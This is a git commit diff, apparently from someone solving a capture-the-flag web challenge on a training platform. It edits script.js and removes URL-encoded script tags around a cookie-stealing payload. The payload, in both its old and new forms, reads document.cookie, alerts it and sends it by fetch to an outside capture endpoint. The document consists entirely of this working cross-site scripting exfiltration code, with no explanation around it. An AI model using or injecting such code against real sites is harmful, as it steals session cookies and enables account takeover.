421bd7a7a9dd14912debe63397f7262dddb5ffa8
Sandro <73789401+Just3Sandro@users.noreply.github.com>
2024-10-23 22:52:07 +0200

    ptet pas besoin de scirpt

--- script.js
+++ script.js
@@ -1,5 +1,3 @@
-%3Cscript%3E
-  var cookies = document.cookie;
-  alert(cookies);
-  fetch('http://challenge01.root-me.org/web-client/ch62/capture-cookies?cookie=' + encodeURIComponent(cookies));
-%3C/script%3E
+var cookies = document.cookie;
+alert(cookies);
+fetch('http://challenge01.root-me.org/web-client/ch62/capture-cookies?cookie=' + encodeURIComponent(cookies));
